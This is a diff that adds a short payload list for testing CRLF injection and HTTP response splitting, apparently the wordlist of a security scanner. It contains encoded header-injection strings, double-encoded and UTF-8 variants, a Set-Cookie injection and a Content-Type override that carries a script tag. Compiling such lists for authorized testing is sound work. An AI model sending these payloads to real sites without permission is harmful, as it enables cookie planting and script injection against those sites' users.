@@ -1,0 +1,25 @@
+# CRLF Injection payloads
+# Inject CRLF sequences to test for HTTP response splitting
+
+# Standard CRLF + header injection
+%0d%0aInjected: true
+%0d%0aInjected:%20true
+
+# Double-encoded
+%250d%250aInjected:%20true
+
+# LF only / CR only
+%0aInjected:%20true
+%0dInjected:%20true
+
+# UTF-8 line separators
+%e5%98%8a%e5%98%8dInjected:%20true
+
+# Response splitting (body injection)
+%0d%0a%0d%0a<injected>test</injected>
+
+# Set-Cookie injection
+%0d%0aSet-Cookie:%20testcookie=injected
+
+# Content-Type override
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
